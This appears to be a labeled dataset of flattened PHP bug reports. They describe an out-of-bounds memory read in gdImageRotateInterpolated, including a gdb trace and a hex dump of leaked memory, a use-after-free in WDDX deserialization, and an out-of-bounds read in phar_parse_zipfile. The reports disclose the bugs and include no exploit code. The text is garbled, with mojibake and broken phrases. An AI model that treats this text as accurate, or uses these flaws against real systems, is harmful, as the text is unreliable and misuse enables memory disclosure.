string_name command line code handle_exceptions at home/elaw/php-5.6.15/zend/zend_execute_api.c:1135 9 in do_cli argc argv at home/elaw/php-5.6.15/sapi/cli/php_cli.c:1034 10 in main argc argv at home/elaw/php-5.6.15/sapi/cli/php_cli.c:1378 11 in libc_start_main main main argc argv init optimized out fini optimized out rtld_fini optimized out stack_end at libc-start.c:287 12 in start 3 one can see that the color platte only has 256 entries gdb-peda ptype src type struct gdimagestruct int red 256 int green 256 int blue 256 4 thus we are encountering an array index out of bounds 5 i ve created a full exploit that reads large contiguous chunk of memory the poc can be obtained from php gdimagerotateinterpolated_array_index_oob_mem_read.php 0c40 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 0c50 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 9d 锟 0c60 01 00 00 9d 01 00 00 fd 01 00 00 00 01 00 00 00 锟 锟 0c70 01 00 00 ef 01 00 00 00 01 00 00 2f 01 00 00 00 锟 0c80 01 00 00 20 01 00 00 ff 01 00 00 c8 01 00 00 ff 锟 锟 锟 0c90 01 00 00 20 01 00 00 ff 01 00 00 c8 01 00 00 ff 锟 锟 锟 0ca0 01 00 00 70 01 00 00 ff 01 00 00 60 01 00 00 ff p 锟 锟 0cb0 01 00 00 08 01 00 00 ff 01 00 00 b0 01 00 00 ff 锟 锟 锟 0cc0 01 00 00 58 01 00 00 ff 01 00 00 88 01 00 00 ff x 锟 锟 锟 0cd0 01 00 00 30 01 00 00 ff 01 00 00 d8 01 00 00 ff 0 锟 锟 锟 0ce0 01 00 00 80 01 00 00 ff 01 00 00 28 01 00 00 ff 锟 锟 锟 0cf0 01 00 00 d0 01 00 00 ff 01 00 00 58 01 00 00 ff 锟 锟 x 锟 0d00 01 00 00 00 01 00 00 ff 01 00 00 a8 01 00 00 ff 锟 锟 锟 0d10 01 00 00 50 01 00 00 ff 01 00 00 f8 01 00 00 ff p 锟 锟 锟 0d20 01 00 00 a0 01 00 00 ff 01 00 00 d8 01 00 00 ff 锟 锟 锟 锟 0d30 01 00 00 80 01 00 00 ff 01 00 00 28 01 00 00 ff 锟 锟 锟 0d40 01 00 00 d0 01 00 00 ff 01 00 00 78 01 00 00 ff 锟 锟 x 锟 0d50 01 00 00 20 01 00 00 ff 01 00 00 f0 01 00 00 ff 锟 锟 锟 0d60 01 00 00 98 01 00 00 ff 01 00 00 40 01 00 00 ff 锟 锟 锟 6 i ve attached a patch for ext/gd/libgd/gd_interpolation.c for your consideration	11
memory read via gdimagerotateinterpolated array index out of bounds this is the function prototype for imagerotate specifies the background color of an image have it has been rotated this is passed in as an integer that represents an index to the color palette there is a lack of validation of bgd_color one can pass in a large number that exceeds the color palette array this reads memory beyond the color palette information of the memory leak can then be obtained via the background color after the image has been rotated one can see that the color platte only has 256 entries thus we are encountering an array index out of bounds i ve created a full exploit that reads large contiguous chunk of memory	11
use-after-free double-free in wddx deserialize there is use-after-free flaw in wddx deserialize implement when trying to process xml data the name of the following data is specified by attribute name of var tag for example when i was trying to set the name of string data it will then do set_stack_varname which does the following producereyou can see that if stack varname is exists it will assign ent.varname by that value here is our problem what would happen if i open var then close it immediately prior to processing string tag it would call handlers for push/pop elements	11
out-of-bound read in phar_parse_zipfile there is a flaw was found in phar s phar_parse_zipfile function.ext/phar/zip.c the above code block tries to determine where is pk\x05\x06 in buf it is actually end of central directory record structure of zip file then it copies bytes from there to phar_zip_dir_end locator signature is located at end of buf variable it will read out-of-bound buf variable to copy to locator you can see details of debugging below php5 and php7 latest version are vulnerable works on linux mac windows as well i think it is possible to memory leak crash etc	11